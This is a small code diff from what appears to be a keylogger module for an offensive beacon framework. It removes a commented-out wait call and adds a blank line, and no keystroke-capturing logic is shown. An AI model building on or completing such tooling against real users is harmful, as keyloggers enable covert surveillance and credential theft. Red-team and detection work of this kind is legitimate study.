@@ -105,12 +105,11 @@ void start() {
     }
 
     BeaconPrintf( CALLBACK_OUTPUT, "Started the keylogger!" );
-
-    //KERNEL32$WaitForSingleObject( Thread, INFINITE );
 }
 
 void info() {
     PINSTANCE Instance = find_instance();
+
     //
     // get the keylogger struct through its instance
     //
